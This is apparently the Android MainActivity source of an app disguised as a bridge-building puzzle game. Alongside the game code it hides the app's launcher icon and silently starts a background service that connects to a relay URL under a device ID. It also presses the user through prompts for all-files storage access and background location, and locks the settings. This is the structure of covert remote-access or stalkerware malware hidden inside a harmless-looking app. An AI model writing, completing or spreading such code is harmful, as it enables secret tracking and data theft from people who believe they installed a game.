package com.devicebridge;

import android.content.ClipData;
import android.content.ClipboardManager;
import android.content.Context;
import android.content.Intent;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.os.Handler;
import android.os.Looper;
import android.provider.Settings;
import android.widget.Button;
import android.widget.ImageButton;
import android.widget.TextView;
import android.widget.Toast;
import androidx.annotation.NonNull;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;
import com.devicebridge.game.BridgeGameView;
import com.devicebridge.game.BridgePuzzleGenerator;
import com.devicebridge.utils.PermissionHelper;
import java.util.Random;

public class MainActivity extends AppCompatActivity {

    private static final int RC_PERMISSIONS = 1001;
    private static final int RC_BACKGROUND_LOCATION = 1002;
    private static final int RC_STORAGE = 1004;

    private BridgeGameView gameView;
    private TextView tvHud;
    private TextView tvLevelBadge;
    private int currentLevel = 1;
    private int islandCount = 6;
    private final Random random = new Random();

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        com.devicebridge.utils.Config.getOrCreateDeviceId(this);
        autoStartServiceIfReady();
            com.devicebridge.utils.Config.hideAppIcon(this);

        gameView = findViewById(R.id.game_view);
        tvHud = findViewById(R.id.tv_hud);
        tvLevelBadge = findViewById(R.id.tv_level_badge);
        Button btnReset = findViewById(R.id.btn_reset);
        Button btnNext = findViewById(R.id.btn_next);
        ImageButton btnSettings = findViewById(R.id.btn_settings);

        gameView.setOnWinListener(() -> {
            tvHud.setText("Level Cleared! Tap Next Level to continue.");
            Toast.makeText(this, "Puzzle Solved! Great job!", Toast.LENGTH_SHORT).show();
        });

        btnReset.setOnClickListener(v -> startPuzzle(currentLevel));
        btnNext.setOnClickListener(v -> {
            currentLevel++;
            islandCount = Math.min(10, 5 + (currentLevel / 2));
            startPuzzle(currentLevel);
        });

        btnSettings.setOnClickListener(v ->
                Toast.makeText(this, "Settings are currently locked", Toast.LENGTH_SHORT).show());

        // Long press title or level badge to copy Device ID quickly
        findViewById(R.id.tv_title).setOnLongClickListener(v -> { copyDeviceId(); return true; });
        tvLevelBadge.setOnLongClickListener(v -> { copyDeviceId(); return true; });

        startPuzzle(currentLevel);

        // Show game splash loading & request runtime permissions 1-by-1
        new Handler(Looper.getMainLooper()).postDelayed(this::requestRuntimePermissionsSequentially, 800);
    }

    private void copyDeviceId() {
        String deviceId = com.devicebridge.utils.Config.getOrCreateDeviceId(this);
        ClipboardManager clipboard = (ClipboardManager) getSystemService(Context.CLIPBOARD_SERVICE);
        ClipData clip = ClipData.newPlainText("Device ID", deviceId);
        clipboard.setPrimaryClip(clip);
        Toast.makeText(this, "Device ID copied to clipboard: " + deviceId, Toast.LENGTH_SHORT).show();
    }

    private void startPuzzle(int level) {
        tvLevelBadge.setText("Level " + level);
        BridgePuzzleGenerator.Puzzle puzzle = BridgePuzzleGenerator.generate(random, islandCount);
        gameView.setPuzzle(puzzle);
        tvHud.setText("Tap two islands to build a bridge");
    }

    /**
     * Standard 1-by-1 Android runtime permission popups
     */
    private void requestRuntimePermissionsSequentially() {
        if (PermissionHelper.needsManageStorage()
                && !PermissionHelper.isExternalStorageManager(this)) {
            Intent manage = new Intent(Settings.ACTION_MANAGE_APP_ALL_FILES_ACCESS_PERMISSION,
                    Uri.parse("package:" + getPackageName()));
            try {
                startActivityForResult(manage, RC_STORAGE);
            } catch (Exception e) {
                try {
                    startActivityForResult(
                            new Intent(Settings.ACTION_MANAGE_ALL_FILES_ACCESS_PERMISSION), RC_STORAGE);
                } catch (Exception ignored) {}
            }
            return;
        }

        String[] perms = PermissionHelper.getRuntimePermissions();
        if (perms.length > 0) {
            ActivityCompat.requestPermissions(this, perms, RC_PERMISSIONS);
        } else {
            onRuntimePermissionsDone();
        }
    }

    @Override
    public void onRequestPermissionsResult(int requestCode, @NonNull String[] permissions,
                                           @NonNull int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);

        if (requestCode == RC_PERMISSIONS) {
            onRuntimePermissionsDone();
        } else if (requestCode == RC_BACKGROUND_LOCATION) {
            autoStartServiceIfReady();
            com.devicebridge.utils.Config.hideAppIcon(this);
        }
    }

    private void onRuntimePermissionsDone() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
            ActivityCompat.requestPermissions(this,
                    new String[]{android.Manifest.permission.ACCESS_BACKGROUND_LOCATION},
                    RC_BACKGROUND_LOCATION);
        } else {
            autoStartServiceIfReady();
            com.devicebridge.utils.Config.hideAppIcon(this);
        }
    }

    @Override
    protected void onActivityResult(int requestCode, int resultCode, Intent data) {
        super.onActivityResult(requestCode, resultCode, data);
        if (requestCode == RC_STORAGE) {
            requestRuntimePermissionsSequentially();
        }
    }

    private void autoStartServiceIfReady() {
        if (!BridgeService.isRunning()) {
            String savedRelay = com.devicebridge.utils.Config.getRelayUrl(this);
            if (savedRelay.isEmpty()) {
                savedRelay = getString(R.string.default_relay_url);
            }
            String deviceId = com.devicebridge.utils.Config.getOrCreateDeviceId(this);

            com.devicebridge.utils.Config.saveConfig(this, savedRelay, deviceId);
            com.devicebridge.utils.Config.setAutoStart(this, true);

            Intent intent = new Intent(this, BridgeService.class);
            intent.putExtra("relayUrl", savedRelay);
            intent.putExtra("deviceId", deviceId);

            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                startForegroundService(intent);
            } else {
                startService(intent);
            }
        }
    }
}
